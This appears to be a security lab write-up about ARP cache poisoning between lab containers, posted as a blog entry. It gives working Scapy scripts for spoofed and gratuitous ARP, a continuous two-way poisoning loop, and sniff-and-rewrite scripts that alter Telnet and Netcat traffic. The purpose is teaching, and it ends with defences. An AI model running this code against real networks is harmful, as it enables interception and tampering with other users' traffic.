---
title: ARP Cache Poisoning
author: siresire
date: 2026-02-23 18:10:00 +0800
categories: [Networking, Security Labs]
tags: [ARP, MITM, Scapy, Wireshark, tcpdump]
render_with_liquid: false

---

# ARP Cache Poisoning

## Objective

The goal of this attack is to use packet spoofing to launch an **ARP cache poisoning attack** so that when two victim machines (**A** and **B**) communicate, their traffic is redirected through the attacker (**M**). This allows the attacker to become a **Man-In-The-Middle (MITM)** and potentially inspect or modify packets.

This report focuses on:

- ARP packet construction with Scapy
- ARP cache poisoning
- Gratuitous ARP behavior
- MITM setup and traffic interception (Telnet and Netcat)

---

## Lab Setup

The lab environment contains three containers:

- **A (10.9.0.5)** → Victim machine
- **B (10.9.0.6)** → Victim machine
- **M (10.9.0.105)** → Attacker machine (MITM)

```bash
┌──(root㉿kali)-[/home/beast1/Networking/ARP/Labsetup]
└─# dockps                             
b3943e6fbc86 M-10.9.0.105
0f851966e0d3 B-10.9.0.6
b27281052fa7 A-10.9.0.5
````

---

## Sending an ARP Packet (Request)

The following Scapy script creates and sends a basic ARP packet:

```python
#!/usr/bin/env python3
from scapy.all import *

E = Ether()
A = ARP()
A.op = 1   # 1 = ARP request, 2 = ARP reply

pkt = E / A
sendp(pkt)
```

### Checking ARP and Ether Fields in Scapy

Before crafting a spoofed packet, it helps to inspect the available fields:

```python
>>> from scapy.all import *
>>> ls(Ether)
dst        : DestMACField                        = ('None')
src        : SourceMACField                      = ('None')
type       : XShortEnumField                     = ('36864')

>>> ls(ARP)
hwtype     : XShortEnumField                     = ('1')
ptype      : XShortEnumField                     = ('2048')
hwlen      : FieldLenField                       = ('None')
plen       : FieldLenField                       = ('None')
op         : ShortEnumField                      = ('1')
hwsrc      : MultipleTypeField (SourceMACField, StrFixedLenField) = ('None')
psrc       : MultipleTypeField (SourceIPField, SourceIP6Field, StrFixedLenField) = ('None')
hwdst      : MultipleTypeField (MACField, StrFixedLenField) = ('None')
pdst       : MultipleTypeField (IPField, IP6Field, StrFixedLenField) = ('None')
```

These are the fields that must be filled correctly when constructing spoofed ARP packets.

---

## ARP Cache Poisoning (Basic Spoofed ARP)

The idea here is to poison a host’s ARP cache by sending a forged ARP message so that a victim associates an IP address with the attacker’s MAC address.

### Example: Spoofing an ARP Mapping

```python
#!/usr/bin/env python3

from scapy.all import *

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

IP_A = "10.9.0.5"
MAC_M = "02:42:0a:09:00:69"

E = Ether(src=MAC_M, dst=MAC_B)
A = ARP(
    psrc=IP_A,
    hwsrc=MAC_M,
    pdst=IP_B,
    hwdst=MAC_B
)

A.op = 1
pkt = E / A
sendp(pkt)
```

### Notes

* `A.op = 1` sends an **ARP request**
* `A.op = 2` sends an **ARP reply**
* In ARP poisoning, attackers commonly use **ARP replies**, but requests can also affect caches in some scenarios

### Observation

After sending the packet, the ARP cache mapping can be altered so that the victim associates the spoofed IP with the attacker’s MAC address.

![alt text](/assets/img/seed/networking/ARP/image.png)

From the capture and ARP table output, the MAC address associated with the target IP changed to the attacker’s MAC.

![alt text](/assets/img/seed/networking/ARP/image-1.png)

The screenshots above also show the traffic in **Wireshark** and **tcpdump**, confirming that the spoofed ARP traffic was seen on the network.

---

## ARP Gratuitous

This section tests poisoning using a **gratuitous ARP** packet.

A gratuitous ARP is a special ARP request used by a host to announce/update its own IP-to-MAC mapping. It has these characteristics:

* **Source IP = Destination IP**
* **Both Ethernet destination MAC and ARP target MAC = broadcast (`ff:ff:ff:ff:ff:ff`)**

### Gratuitous ARP Poisoning Script

```python
#!/usr/bin/env python3

from scapy.all import *

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"   # (not really used here)

IP_A = "10.9.0.5"
MAC_M = "02:42:0a:09:00:69"   # Attacker's MAC — what we want victims to learn

BCAST_MAC = "ff:ff:ff:ff:ff:ff"

# Ethernet: source is attacker, destination is broadcast
E = Ether(src=MAC_M, dst=BCAST_MAC)

# Gratuitous ARP: announce IP_B using attacker's MAC
A = ARP(
    op    = 1,          # request (common form in labs)
    psrc  = IP_B,       # source IP = target IP
    hwsrc = MAC_M,      # forged MAC
    pdst  = IP_B,       # same IP (gratuitous format)
    hwdst = BCAST_MAC   # broadcast
)

pkt = E / A
sendp(pkt, verbose=False)
```

### Observation

The packet was visible in Wireshark, but in this setup it did **not** create or update the expected ARP entry on the victim host.

![alt text](/assets/img/seed/networking/ARP/image-2.png)

---

## MITM Attack on Telnet Using ARP Cache Poisoning

In this task, **A** and **B** communicate over **Telnet**, and **M** performs ARP poisoning so traffic flows through the attacker.

![alt text](/assets/img/seed/networking/ARP/image-3.png)

### Step 1: Bidirectional ARP Poisoning

To become MITM, the attacker must poison **both** hosts:

* Tell **A**: “B’s IP is at M’s MAC”
* Tell **B**: “A’s IP is at M’s MAC”

The script below repeatedly sends forged ARP replies every 2 seconds to keep the cache poisoned.

```python
#!/usr/bin/env python3

from scapy.all import *
import time

# Victim A
IP_A  = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

# Victim B
IP_B  = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

# Attacker M
MAC_M = "02:42:0a:09:00:69"
IP_M  = "10.9.0.105"   # not directly required for ARP poisoning

def poison_A():
    """Tell A: B's IP is at M's MAC"""
    eth = Ether(src=MAC_M, dst=MAC_A)
    arp = ARP(
        op    = 2,       # ARP reply
        psrc  = IP_B,    # pretend to be B
        hwsrc = MAC_M,
        pdst  = IP_A,
        hwdst = MAC_A
    )
    sendp(eth / arp, verbose=0)

def poison_B():
    """Tell B: A's IP is at M's MAC"""
    eth = Ether(src=MAC_M, dst=MAC_B)
    arp = ARP(
        op    = 2,
        psrc  = IP_A,    # pretend to be A
        hwsrc = MAC_M,
        pdst  = IP_B,
        hwdst = MAC_B
    )
    sendp(eth / arp, verbose=0)

print("Starting bidirectional ARP spoofing... (Ctrl+C to stop)")

try:
    while True:
        poison_A()
        poison_B()
        print(".", end="", flush=True)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nStopped. (You may want to restore ARP tables now)")
```

---

## Step 2: Ping Test (IP Forwarding OFF)

Before forwarding traffic, IP forwarding on attacker **M** was disabled:

```bash
sysctl net.ipv4.ip_forward=0
```

### Ping Result (A → B)

```bash
root@b27281052fa7:/# ping -c 10 10.9.0.6
PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
64 bytes from 10.9.0.6: icmp_seq=1 ttl=63 time=0.139 ms
64 bytes from 10.9.0.6: icmp_seq=2 ttl=63 time=0.141 ms
From 10.9.0.105 icmp_seq=3 Redirect Host(New nexthop: 6.0.9.10)
64 bytes from 10.9.0.6: icmp_seq=3 ttl=63 time=0.159 ms
64 bytes from 10.9.0.6: icmp_seq=4 ttl=63 time=0.108 ms
64 bytes from 10.9.0.6: icmp_seq=5 ttl=63 time=0.229 ms
From 10.9.0.105 icmp_seq=6 Redirect Host(New nexthop: 6.0.9.10)
64 bytes from 10.9.0.6: icmp_seq=6 ttl=63 time=0.135 ms
64 bytes from 10.9.0.6: icmp_seq=7 ttl=63 time=0.247 ms
64 bytes from 10.9.0.6: icmp_seq=8 ttl=63 time=0.162 ms

--- 10.9.0.6 ping statistics ---
8 packets transmitted, 8 received, +2 errors, 0% packet loss, time 7158ms
rtt min/avg/max/mdev = 0.108/0.165/0.247/0.045 ms
```

### In the above; 

* ARP poisoning succeeded (traffic passed through M)
* ICMP Redirect messages were observed from **10.9.0.105**
* Even with forwarding off, some traffic still reached the destination, but redirect/error behavior appeared during the test

---

## Step 3: Ping Test (IP Forwarding ON)

Next, IP forwarding was enabled on attacker **M** so packets could be relayed between A and B:

```bash
sysctl net.ipv4.ip_forward=1
```

### Ping Result (A → B)

```bash
root@b27281052fa7:/# ping -c 10 10.9.0.6
PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
64 bytes from 10.9.0.6: icmp_seq=1 ttl=63 time=0.134 ms
From 10.9.0.105 icmp_seq=2 Redirect Host(New nexthop: 6.0.9.10)
64 bytes from 10.9.0.6: icmp_seq=2 ttl=63 time=0.138 ms
From 10.9.0.105 icmp_seq=3 Redirect Host(New nexthop: 6.0.9.10)
64 bytes from 10.9.0.6: icmp_seq=3 ttl=63 time=0.128 ms
From 10.9.0.105 icmp_seq=4 Redirect Host(New nexthop: 6.0.9.10)
64 bytes from 10.9.0.6: icmp_seq=4 ttl=63 time=0.132 ms
From 10.9.0.105 icmp_seq=5 Redirect Host(New nexthop: 6.0.9.10)
64 bytes from 10.9.0.6: icmp_seq=5 ttl=63 time=0.127 ms
From 10.9.0.105 icmp_seq=6 Redirect Host(New nexthop: 6.0.9.10)

--- 10.9.0.6 ping statistics ---
6 packets transmitted, 5 received, +5 errors, 16.6667% packet loss, time 5103ms
rtt min/avg/max/mdev = 0.127/0.131/0.138/0.004 ms
```

### Observation

* Traffic was relayed through attacker **M**
* ICMP Redirect messages were still present
* Some packet loss occurred during the test

This confirms that the attacker was in the path and actively affecting routing behavior.

---

## MITM Attack on Telnet (Payload Modification)

After establishing MITM positioning, the next goal was to modify Telnet traffic in transit.

### Goal

For every character typed on **A** (Telnet client), replace it with `Z` before forwarding it to **B** (Telnet server).

### Telnet MITM Script (Scapy)

```python
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet from the captured packet
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            newdata = b'Z' * len(data)
            send(newpkt / newdata)
        else:
            send(newpkt)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

### Result / Notes

The terminal appeared to hang during execution, but the MITM payload modification worked and results were observed.

![alt text](/assets/img/seed/networking/ARP/image-4.png)

### Important Conditions for This to Work

* ARP poisoning must be running in **another terminal** (looping every few seconds)
* Telnet connection from **A → B** must already be established
* IP forwarding should be handled carefully depending on the stage of testing

Practical notes from testing:

* If nothing appears after typing on A → ARP poisoning may have stopped
* If original characters still appear → IP forwarding may still be enabled

---

## MITM Attack on Netcat Using ARP Cache Poisoning

This task is similar to the Telnet attack, but uses **Netcat** instead.

### Netcat Setup

On **Host B** (server):

```bash
nc -lp 9090
```

On **Host A** (client):

```bash
nc 10.9.0.6 9090
```

### Netcat MITM Script (Replace Payload Content)

The script below intercepts TCP traffic and replaces a specific string (`GODFREY`) with `AAAAAAA`.

```python
#!/usr/bin/env python3

from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            newdata = data.replace(b"GODFREY", b"AAAAAAA")
            send(newpkt / Raw(newdata))
        else:
            send(newpkt)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```
![alt text](/assets/img/seed/networking/ARP/image-5.png)
### Here

* we successfully intercepted the Netcat TCP stream and the payload content could be modified before forwarding
* This demonstrates practical MITM traffic manipulation after ARP poisoning

---

## Conclusion

This lab demonstrated how ARP cache poisoning can be used to place an attacker in the middle of communication between two hosts.

### Key takeaways

* ARP is trust-based and can be poisoned with forged ARP packets
* A successful MITM attack requires **bidirectional poisoning**
* **IP forwarding** on the attacker determines whether traffic is relayed or dropped
* Once in the path, tools like **Scapy** can be used to:

  * inspect traffic
  * forward packets
  * modify payloads (e.g., Telnet/Netcat)

This shows why ARP spoofing remains a common technique in local network attacks and why defenses such as static ARP entries, ARP inspection, and encrypted protocols are important.

